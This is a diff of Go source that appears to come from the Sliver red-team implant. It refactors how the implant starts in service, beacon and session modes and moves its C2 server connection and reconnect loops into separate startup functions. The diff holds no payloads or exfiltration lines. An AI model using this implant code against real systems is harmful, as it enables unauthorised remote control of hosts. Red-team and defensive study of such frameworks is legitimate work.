@@ -105,25 +105,11 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 	for {
 		select {
 		default:
-			abort := make(chan struct{})
-			connections := transports.StartConnectionLoop(c2Servers, abort)
-			for connection := range connections {
-				if connection == nil {
-					break
-				}
-				err := sessionMainLoop(connection)
-				if err != nil {
-					connectionErrors++
-					if transports.GetMaxConnectionErrors() < connectionErrors {
-						return
-					}
-				}
-				reconnect := transports.GetReconnectInterval()
-				// {{if .Config.Debug}}
-				log.Printf("Reconnect sleep: %s", reconnect)
-				// {{end}}
-				time.Sleep(reconnect)
-			}
+			// {{if .Config.IsBeacon}}
+			beaconStartup()
+			// {{else}}
+			sessionStartup()
+			// {{end}}
 		case c := <-r:
 			switch c.Cmd {
 			case svc.Interrogate:
@@ -199,7 +185,16 @@ func main() {
 	// {{else}}
 
 	// {{if .Config.IsBeacon}}
+	beaconStartup()
+	// {{else}} ------- IsBeacon/IsSession -------
+	sessionStartup()
+	// {{end}}
 
+	// {{end}} ------- IsService -------
+}
+
+// {{if .Config.IsBeacon}}
+func beaconStartup() {
 	// {{if .Config.Debug}}
 	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
 	// {{end}}
@@ -227,9 +222,11 @@ func main() {
 		// {{end}}
 		time.Sleep(reconnect)
 	}
+}
 
-	// {{else}} ------- IsBeacon/IsSession -------
+// {{else}}
 
+func sessionStartup() {
 	// {{if .Config.Debug}}
 	log.Printf("Running in session mode")
 	// {{end}}
@@ -254,10 +251,9 @@ func main() {
 		// {{end}}
 		time.Sleep(reconnect)
 	}
-	// {{end}}
-
-	// {{end}}
 }
+
+// {{end}}
 
 // {{if .Config.IsBeacon}}
 func beaconMainLoop(beacon *transports.Beacon) error {
